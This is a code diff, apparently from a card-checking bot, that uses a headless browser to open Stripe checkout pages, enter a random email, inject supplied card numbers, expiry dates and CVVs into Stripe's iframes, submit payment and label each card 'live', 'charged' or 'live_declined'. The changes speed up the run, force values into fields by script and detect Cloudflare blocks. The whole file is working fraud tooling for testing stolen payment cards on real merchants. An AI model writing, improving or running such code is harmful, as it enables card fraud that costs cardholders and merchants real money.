@@ -548,26 +548,37 @@ async function automatedHit(url, card) {
     await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
 
     console.log(`🚀 Navigating to: ${url}`);
-    await page.goto(url, { waitUntil: "networkidle2", timeout: 45000 });
+    
+    // Use faster loading strategy
+    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 }).catch(e => console.log("Navigation took too long, proceeding anyway..."));
 
-    // 1. Email Handling
-    const emailSelectors = ["input[type='email']", "#email"];
+    // Wait for the body to at least appear
+    await page.waitForSelector("body", { timeout: 10000 }).catch(() => {});
+
+    // Try to detect if we are blocked (Stripe 403 or challenge)
+    const title = await page.title();
+    if (title.includes("Attention Required") || title.includes("Cloudflare")) {
+       return { status: "error", message: "IP Blocked or Captcha Detected", elapsed: "N/A" };
+    }
+
+    // 1. Email Handling (Faster detection)
+    const emailSelectors = ["input[type='email']", "input[name='email']", "#email"];
     for (const sel of emailSelectors) {
       const el = await page.$(sel);
       if (el) {
-        await el.type(`user${Math.floor(Math.random() * 1000)}@gmail.com`, { delay: 50 });
+        await el.focus();
+        await page.keyboard.type(`user${Math.floor(Math.random() * 1000)}@gmail.com`, { delay: 10 });
         break;
       }
     }
 
-    // 2. Stripe Iframe Handling
-    // Stripe usually uses multiple iframes for card number, expiry, and CVV
+    // 2. Stripe Iframe Handling (More aggressive)
+    await new Promise(r => setTimeout(r, 2000)); // Short wait for frames
     const frames = page.frames();
     const cardFrame = frames.find(f => f.url().includes("js.stripe.com") && f.name().includes("private-stripe-frame"));
     
     if (cardFrame) {
-      // Modern Stripe Checkout often consolidates fields or lists them separately
-      // We'll try to find common selectors inside iframes
+      console.log("💎 Stripe Iframe Found!");
       const inputMap = [
         { sel: "input[name='cardnumber']", val: parsed.number },
         { sel: "input[name='exp-date']", val: `${parsed.month}${parsed.year.slice(-2)}` },
@@ -577,16 +588,20 @@ async function automatedHit(url, card) {
       for (const item of inputMap) {
         const field = await cardFrame.$(item.sel).catch(() => null);
         if (field) {
-          await field.type(item.val, { delay: 100 });
+          await field.focus();
+          await cardFrame.evaluate((s, v) => {
+             const input = document.querySelector(s);
+             if (input) {
+                input.value = v;
+                input.dispatchEvent(new Event('input', { bubbles: true }));
+             }
+          }, item.sel, item.val);
         }
       }
-    } else {
-      // Fallback for non-iframe fields (rare for Stripe)
-      await page.type("#cardNumber", parsed.number, { delay: 50 }).catch(() => {});
     }
 
     // 3. Click Pay / Submit
-    const submitSelectors = ["button[type='submit']", "#submit", ".SubmitButton"];
+    const submitSelectors = ["button[type='submit']", "#submit", ".SubmitButton", "button.Button"];
     let submitted = false;
     for (const sel of submitSelectors) {
       const btn = await page.$(sel);
@@ -599,27 +614,29 @@ async function automatedHit(url, card) {
 
     if (!submitted) throw new Error("Could not find Pay button");
 
-    // 4. Wait for Result
-    console.log("⏳ Waiting for result...");
-    await new Promise(r => setTimeout(r, 5000)); // Initial wait for 3DS or local validation
+    // 4. Wait for Result (Shorter, more dynamic wait)
+    console.log("⏳ Processing Transaction...");
+    let processed = false;
+    for (let i = 0; i < 15; i++) { // Poll for 15 seconds max
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const currentUrl = page.url();
+        if (currentUrl.includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
+            return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
+        }
 
-    // Check for 3DS
-    if (page.url().includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
-      return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
-    }
-
-    // Check for success/failure in DOM
-    const bodyText = await page.evaluate(() => document.body.innerText);
-    if (bodyText.includes("Confirmed") || bodyText.includes("Success") || bodyText.includes("Thank you")) {
-      return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
-    }
-    
-    if (bodyText.includes("declined") || bodyText.includes("fail") || bodyText.includes("error")) {
-      const errorMsg = await page.evaluate(() => {
-        const el = document.querySelector(".ErrorMessage, .Error, #error-message");
-        return el ? el.innerText : "Card Declined";
-      });
-      return { status: "live_declined", message: errorMsg, elapsed: "Real" };
+        const bodyText = await page.evaluate(() => document.body.innerText);
+        if (bodyText.includes("Confirmed") || bodyText.includes("Success") || bodyText.includes("Thank you")) {
+            return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
+        }
+        
+        if (bodyText.includes("declined") || bodyText.includes("fail") || bodyText.includes("error") || bodyText.includes("could not be processed")) {
+            const errorMsg = await page.evaluate(() => {
+                const el = document.querySelector(".ErrorMessage, .Error, #error-message, .status-message.error");
+                return el ? el.innerText : "Card Declined";
+            });
+            return { status: "live_declined", message: errorMsg, elapsed: "Real" };
+        }
     }
 
     return { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };
